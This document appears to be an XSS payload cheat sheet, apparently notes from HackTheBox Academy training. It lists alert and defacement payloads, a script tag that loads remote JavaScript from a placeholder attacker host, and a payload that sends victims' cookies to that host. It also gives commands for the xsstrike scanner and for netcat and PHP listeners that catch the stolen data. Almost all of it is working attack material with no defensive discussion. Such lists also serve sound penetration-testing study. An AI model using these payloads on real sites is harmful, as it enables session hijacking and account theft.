# XSS

## Basic Payloads

### Basic alert

```html
<script>alert(window.origin)</script>
```

### Plaintext injection

```html
<plaintext>
```

### Basic print execution

```html
<script>print()</script>
```

### HTML-based alert

```html
<img src="" onerror=alert(window.origin)>
```

---

## DOM Manipulation

### Change background color

```html
<script>document.body.style.background = "#141d2b"</script>
```

### Change background image

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

### Change website title

```html
<script>document.title = 'HackTheBox Academy'</script>
```

### Overwrite entire page body

```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```

### Remove specific element

```html
<script>document.getElementById('urlform').remove();</script>
```

---

## Advanced Payloads

### Load remote script

```html
<script src="http://OUR_IP/script.js"></script>
```

### Exfiltrate cookies

```html
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```

---

## Common Commands

### Scanning & Exploitation

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

### Network Listeners

Start a listener:

```bash
sudo nc -lvnp 80
```

Start a PHP server:

```bash
sudo php -S 0.0.0.0:80
```
